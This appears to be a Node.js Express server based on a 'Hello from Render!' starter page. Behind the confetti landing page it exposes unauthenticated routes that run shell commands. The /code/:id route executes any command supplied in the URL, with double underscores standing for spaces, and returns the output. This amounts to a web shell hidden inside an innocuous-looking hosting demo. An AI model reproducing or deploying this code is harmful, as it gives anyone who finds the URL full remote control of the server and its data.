const exec = require('child_process').execSync;
// 执行 npm run build 命令
const pm2tart = () => {
  exec('npm run pm2start', (error, stdout, stderr) => {
    if (!error) {
      // 成功
      console.log("success___________________")
    } else {
      // 失败
      console.log("fail___________________")
    }
  });
  return "trigger";
};

const pwd = () => {
  var str = exec('pwd');
  return (str.toString("utf8").trim());
}

const uname = () => {
  var str = exec('uname -a');
  return (str.toString("utf8").trim());
}

const runCode = (text) => {
  var str = exec(text);
  return (str.toString("utf8").trim());
}


const status = () => {
  var str = exec('npm run status');
  return (str.toString("utf8").trim());
}


const express = require("express");
const app = express();
const port = process.env.PORT || 3001;

app.get("/", (req, res) => res.type('html').send(html));
app.get("/pwd", (req, res) => res.type('text').send(pwd()));
app.get("/uname", (req, res) => res.type('text').send(uname()));
app.get("/code/:id", (req, res) => {
  const code = req.params.id;
  const result = runCode(code.replace(/__/g, " "));
  res.type('text').send(result);
});
app.get("/status", (req, res) => res.type('text').send(status()));
app.get("/start", (req, res) => res.type('text').send(
  pm2tart()
));

app.listen(port, () => console.log(`Example app listening on port ${port}!`));


const html = `
<!DOCTYPE html>
<html>
  <head>
    <title>Hello from Render!</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <script>
      setTimeout(() => {
        confetti({
          particleCount: 100,
          spread: 70,
          origin: { y: 0.6 },
          disableForReducedMotion: true
        });
      }, 500);
    </script>
    <style>
      @import url("https://p.typekit.net/p.css?s=1&k=vnd5zic&ht=tk&f=39475.39476.39477.39478.39479.39480.39481.39482&a=18673890&app=typekit&e=css");
      @font-face {
        font-family: "neo-sans";
        src: url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff2"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("opentype");
        font-style: normal;
        font-weight: 700;
      }
      html {
        font-family: neo-sans;
        font-weight: 700;
        font-size: calc(62rem / 16);
      }
      body {
        background: white;
      }
      section {
        border-radius: 1em;
        padding: 1em;
        position: absolute;
        top: 50%;
        left: 50%;
        margin-right: -50%;
        transform: translate(-50%, -50%);
      }
    </style>
  </head>
  <body>
    <section>
      Hello from Render!
    </section>
  </body>
</html>
`
